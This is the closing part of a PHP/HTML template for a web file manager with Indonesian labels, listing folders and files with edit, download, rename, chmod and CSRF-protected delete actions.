        <h2 class="font-medium">Isi Folder</h2>
        <div class="text-sm text-gray-600">Dir: <?php echo count($dirs); ?> x File: <?php echo count($files); ?></div>
      </div>

      <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($current); ?>" class="flex-1 flex flex-col">
        <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">

        <div class="mb-3 flex flex-wrap gap-2">
          <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Hapus semua yang dipilih?')">Hapus Terpilih</button>
          <button class="btn btn-sm btnw" type="button" onclick="selectAll(true)">Select All</button>
          <button class="btn btn-sm btnw" type="button" onclick="selectAll(false)">Select None</button>
        </div>

        <div class="tablewrap overflow-x-auto rounded-xl border flex-1">
          <table class="tbl min-w-full text-sm">
            <thead class="text-left border-b">
              <tr>
                <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                <th class="py-2 px-2">Nama</th>
                <th class="py-2 px-2">Ukuran</th>
                <th class="py-2 px-2">Perms</th>
                <th class="py-2 px-2">Modifikasi</th>
                <th class="py-2 px-2">Aksi</th>
              </tr>
            </thead>
            <tbody>

              <!-- Dirs -->
              <?php foreach ($dirs as $name): $full=$current.DIRECTORY_SEPARATOR.$name; ?>
              <tr class="border-b">
                <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                <td class="py-2 px-2">
                  <div class="name-cell">
                    <?php echo iconSvgFor($full); ?>
                    <a class="text-blue-700 hover:underline font-medium" href="?p=<?php echo rawurlencode($full); ?>"><?php echo h($name); ?></a>
                    <span class="badge-small">DIR</span>
                  </div>
                </td>
                <td class="py-2 px-2">-</td>
                <td class="py-2 px-2 mono"><?php echo h(permsToString($full)); ?></td>
                <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', @filemtime($full) ?: time())); ?></td>
                <td class="py-2 px-2">
                  <div class="row-actions">
                    <span class="btn btn-xs btnw placeholder">Edit</span>
                    <span class="btn btn-xs btnw placeholder">Download</span>
                    <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                    <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                    <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" onsubmit="return confirm('Hapus folder ini (rekursif)?')" class="inline">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="target" value="<?php echo h($name); ?>">
                      <button class="btn btn-xs btnw" type="submit">Delete</button>
                    </form>
                  </div>

                  <!-- Rename panel -->
                  <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                    <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="old" value="<?php echo h($name); ?>">
                      <input type="text" name="new" class="field w-48" placeholder="Nama baru">
                      <button class="btn btn-sm btnw" type="submit">OK</button>
                      <button class="btn btn-sm btnw" type="button" onclick="this.closest('#rn-<?php echo h($name); ?>').classList.add('hidden')">Batal</button>
                    </form>
                  </div>

                  <!-- Chmod panel -->
                  <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                    <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="target" value="<?php echo h($name); ?>">
                      <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                      <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                      <button class="btn btn-sm btnw" type="submit">OK</button>
                      <button class="btn btn-sm btnw" type="button" onclick="this.closest('#cm-<?php echo h($name); ?>').classList.add('hidden')">Batal</button>
                    </form>
                  </div>
                </td>
              </tr>
              <?php endforeach; ?>

              <!-- Files -->
              <?php foreach ($files as $name):
                $full=$current.DIRECTORY_SEPARATOR.$name;
                $ext=strtolower(pathinfo($name, PATHINFO_EXTENSION));
                $isZip = in_array($ext,array('zip'));
              ?>
              <tr class="border-b">
                <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php echo h($name); ?>"></td>
                <td class="py-2 px-2">
                  <div class="name-cell">
                    <?php echo iconSvgFor($full); ?>
                    <span><?php echo h($name); ?></span>
                  </div>
                </td>
                <td class="py-2 px-2 mono"><?php echo h(humanSize((int)@filesize($full))); ?></td>
                <td class="py-2 px-2 mono"><?php echo h(permsToString($full)); ?></td>
                <td class="py-2 px-2"><?php echo h(date('Y-m-d H:i:s', @filemtime($full) ?: time())); ?></td>
                <td class="py-2 px-2">
                  <div class="row-actions">
                    <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
                    <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Download</a>
                    <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($name); ?>')">Rename</button>
                    <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($name); ?>')">Chmod</button>
                    <form method="post" action="?a=delete&p=<?php echo rawurlencode($current); ?>" class="inline" onsubmit="return confirm('Hapus file ini?')">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="target" value="<?php echo h($name); ?>">
                      <button class="btn btn-xs btnw" type="submit">Delete</button>
                    </form>
                  </div>

                  <!-- Rename -->
                  <div id="rn-<?php echo h($name); ?>" class="hidden mt-2">
                    <form method="post" action="?a=rename&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 mt-1">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="old" value="<?php echo h($name); ?>">
                      <input type="text" name="new" class="field w-48" placeholder="Nama baru">
                      <button class="btn btn-sm btnw" type="submit">OK</button>
                      <button class="btn btn-sm btnw" type="button" onclick="this.closest('#rn-<?php echo h($name); ?>').classList.add('hidden')">Batal</button>
                    </form>
                  </div>

                  <!-- Chmod -->
                  <div id="cm-<?php echo h($name); ?>" class="hidden mt-2">
                    <form method="post" action="?a=chmod&p=<?php echo rawurlencode($current); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                      <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
                      <input type="hidden" name="target" value="<?php echo h($name); ?>">
                      <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                      <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                      <button class="btn btn-sm btnw" type="submit">OK</button>
                      <button class="btn btn-sm btnw" type="button" onclick="this.closest('#cm-<?php echo h($name); ?>').classList.add('hidden')">Batal</button>
                    </form>
                  </div>

                </td>
              </tr>
              <?php endforeach; ?>

              <?php if (empty($dirs) && empty($files)): ?>
                <tr><td colspan="6" class="py-6 text-center text-gray-500">Kosong</td></tr>
              <?php endif; ?>

            </tbody>
          </table>
        </div>
      </form>
    </section>
  </main>

  <script>
    function toggleAll(master){ var rows=document.querySelectorAll('.rowchk'); for(var i=0;i<rows.length;i++){ rows[i].checked=master.checked; } }
    function selectAll(flag){ var rows=document.querySelectorAll('.rowchk'); for(var i=0;i<rows.length;i++){ rows[i].checked=!!flag; } var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
    function toggleRow(id){ var el=document.getElementById(id); if(el){ if(el.classList.contains('hidden')) el.classList.remove('hidden'); else el.classList.add('hidden'); } }
  </script>
</body>
</html>
